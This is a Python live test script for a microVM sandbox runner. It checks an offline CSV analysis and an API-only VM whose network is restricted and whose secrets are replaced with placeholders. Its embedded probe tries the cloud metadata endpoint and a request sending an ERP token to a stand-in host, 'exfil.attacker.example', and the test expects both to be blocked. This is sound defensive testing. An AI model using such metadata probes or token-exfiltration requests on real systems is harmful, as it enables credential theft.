#!/usr/bin/env python3
"""Live check of a running runner (python3 scripts/dev.py runner). Boots real microVMs.

  .venv/bin/python tests/live_runner_check.py
"""
import base64
import json
import os
import secrets
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import httpx

ROOT = Path(__file__).resolve().parents[1]
for line in (ROOT / ".env").read_text().splitlines():
    if "=" in line and not line.startswith("#"):
        k, v = line.split("=", 1)
        os.environ.setdefault(k.strip(), v.split(" #")[0].strip())

RUNNER = os.environ.get("RUNNER_URL", "http://127.0.0.1:8081")
CLIENT = httpx.Client(base_url=RUNNER, headers={"Authorization": f"Bearer {os.environ['RUNNER_TOKEN']}"}, timeout=180)
CSV = (ROOT / "prep/fixtures/payments/vendor_payments_q3.csv").read_bytes()
failures = []


def expect(ok, what):
    print(("PASS " if ok else "FAIL ") + what)
    if not ok:
        failures.append(what)


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


ANALYSIS = rb'''
import json
import pandas as pd
import matplotlib.pyplot as plt
df = pd.read_csv("/work/in/payments.csv")
df["paid_on"] = pd.to_datetime(df["paid_on"], format="mixed")
s = df.groupby("vendor_name")["amount_usd"].sum().sort_values()
fig, ax = plt.subplots(figsize=(8, 4.5)); s.plot.barh(ax=ax); fig.tight_layout(); fig.savefig("/work/out/chart.png", dpi=150)
print(json.dumps({"rows": len(df), "total": round(float(s.sum()), 2)}))
'''

ERP_CALL = rb'''
import json, os, urllib.request
req = urllib.request.Request(os.environ["ERP_URL"] + "/vendors", headers={"Authorization": "Bearer " + os.environ["ERP_TOKEN"]})
print(json.dumps({"erp": json.load(urllib.request.urlopen(req, timeout=10))["count"], "token_in_vm": os.environ["ERP_TOKEN"]}))
for url in ["http://169.254.169.254/v1.json", "https://exfil.attacker.example/c?t=" + os.environ["ERP_TOKEN"]]:
    try:
        urllib.request.urlopen(url, timeout=4)
    except Exception as e:
        print("blocked", url.split("?")[0], type(e).__name__)
'''


def main():
    health = CLIENT.get("/v1/health").json()
    print("health:", health)
    expect(CLIENT.get("/v1/health").status_code == 200, "runner answers /v1/health")
    expect(httpx.post(f"{RUNNER}/v1/sandboxes", json={"mission_id": "test"}).status_code == 401, "calls without the token are refused")

    # 1. Offline analysis VM
    info = CLIENT.post("/v1/sandboxes", json={"mission_id": "livecheck", "step_id": "s1",
                                              "files": {"payments.csv": b64(CSV), "step.py": b64(ANALYSIS)}}).json()
    sid = info["id"]
    print("created:", {k: info[k] for k in ("id", "kernel", "boot_ms", "network", "policy_sha256")})
    try:
        r = CLIENT.post(f"/v1/sandboxes/{sid}/exec", json={"argv": ["python", "/work/in/step.py"]}).json()
        print("exec:", r["exit_code"], r["stdout"].strip()[-200:], r["stderr"][-300:], f"{r['duration_ms']} ms")
        expect(r["exit_code"] == 0 and '"rows": 401' in r["stdout"], "offline VM analyses the CSV as nobody")
        outs = CLIENT.get(f"/v1/sandboxes/{sid}/outputs").json()
        expect(any(o["name"] == "chart.png" for o in outs), f"chart listed in outputs {outs}")
        png = CLIENT.get(f"/v1/sandboxes/{sid}/outputs/chart.png").content
        expect(png[:8] == b"\x89PNG\r\n\x1a\n", f"chart downloads ({len(png)} bytes)")
        m = CLIENT.get(f"/v1/sandboxes/{sid}/metrics").json()
        expect(m.get("memory_limit_bytes", 0) > 0, f"metrics available {m}")
    finally:
        CLIENT.delete(f"/v1/sandboxes/{sid}")

    # 2. API VM: ERP reachable with a placeholder credential; everything else blocked
    real = "erp-" + secrets.token_hex(16)
    seen = {}

    class Erp(BaseHTTPRequestHandler):
        def do_GET(self):
            seen["auth_ok"] = self.headers.get("Authorization") == f"Bearer {real}"
            self.send_response(200 if seen["auth_ok"] else 401)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"count": 20}).encode())

        def log_message(self, *_):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Erp)
    port = server.server_address[1]
    threading.Thread(target=server.serve_forever, daemon=True).start()
    info = CLIENT.post("/v1/sandboxes", json={
        "mission_id": "livecheck", "step_id": "s2",
        "network": {"mode": "api", "host": "host.microsandbox.internal", "port": port, "scheme": "http"},
        "secrets": [{"env": "ERP_TOKEN", "value": real, "allow_host": "host.microsandbox.internal"}],
        "env": {"ERP_URL": f"http://host.microsandbox.internal:{port}"},
        "files": {"erp.py": b64(ERP_CALL)}}).json()
    sid = info["id"]
    print("created:", {k: info[k] for k in ("id", "network", "secrets")})
    try:
        r = CLIENT.post(f"/v1/sandboxes/{sid}/exec", json={"argv": ["python", "/work/in/erp.py"]}).json()
        print("exec:", r["exit_code"], r["stdout"].strip(), r["stderr"][-300:])
        print("net audit:", json.dumps(r["net"])[:900])
        expect('"erp": 20' in r["stdout"] and seen.get("auth_ok"), "ERP call succeeds; the API received the real token")
        expect('"token_in_vm": "$MSB_ERP_TOKEN"' in r["stdout"], "the VM only ever sees the placeholder")
        expect(real not in r["stdout"] and not r["secret_exposed"], "the real token never appears in sandbox output")
        expect("blocked http://169.254.169.254/v1.json" in r["stdout"], "metadata service blocked")
        expect("blocked https://exfil.attacker.example/c" in r["stdout"], "exfiltration domain blocked")
        hosts = {e.get("host") for e in r["net"]}
        expect({"169.254.169.254", "exfil.attacker.example"} <= hosts, f"audit log records both attempts {sorted(h for h in hosts if h)}")
    finally:
        CLIENT.delete(f"/v1/sandboxes/{sid}")
        server.shutdown()
    expect(CLIENT.get("/v1/health").json()["running"] == 0, "no sandboxes left running")
    print(f"\n{len(failures)} failure(s)")
    sys.exit(1 if failures else 0)


if __name__ == "__main__":
    main()
